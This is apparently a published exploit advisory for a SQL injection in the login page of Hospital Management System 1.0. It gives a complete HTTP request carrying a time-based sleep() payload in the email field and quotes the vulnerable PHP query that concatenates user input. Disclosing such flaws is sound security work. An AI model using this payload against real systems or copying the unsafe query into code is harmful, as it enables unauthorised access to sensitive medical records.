---
title: Hospital Management System 1.0 SQL Injection
published: true
---


- Exploit Title: Hospital Management System - SQL Injection
- Google Dork: N/A
- Application: Hospital Management System
- Date: 26.02.2024
- Bugs: SQL Injection
- Exploit Author: SoSPiro
- Vendor Homepage: https://www.sourcecodester.com/
- Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html
- Version: 1.0
- Tested on: Windows 10 64 bit Wampserver
- CVE : N/A


### Vulnerability Description:

A security vulnerability has been identified in this web application due to the direct inclusion of user-input data into SQL queries, rendering it susceptible to SQL Injection attacks. This vulnerability may enable malicious actors to gain unauthorized access to sensitive information.


### Proof of Concept (PoC):

Below is an example of an attack that a malicious actor could execute to exploit this vulnerability.
```
POST /Vaidya%20Mitra/vm/login.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: http://localhost
Connection: close
Referer: http://localhost/Vaidya%20Mitra/vm/login.php
Cookie: _ga=GA1.1.2080672900.1708952048; _gid=GA1.1.1833914840.1708952048; PHPSESSID=18a16tga7k2glh7

useremail=test@123.asd'%2b(select*from(select(sleep(5)))a)%2b'&userpassword=test
```

In this example, the payload appended to the useremail parameter aims to execute a sleep function, intentionally delaying the server's response time. Real-world attacks could involve more malicious operations.

[Request - Response foto](https://i.imgur.com/LxENLBz.png)

### Vulnerable code section:

***

```
/Vaidya%20Mitra/vm/login.php
```

```php
$email = $_POST['useremail'];
$password = $_POST['userpassword'];

$result = $database->query("select * from webuser where email='$email'");
```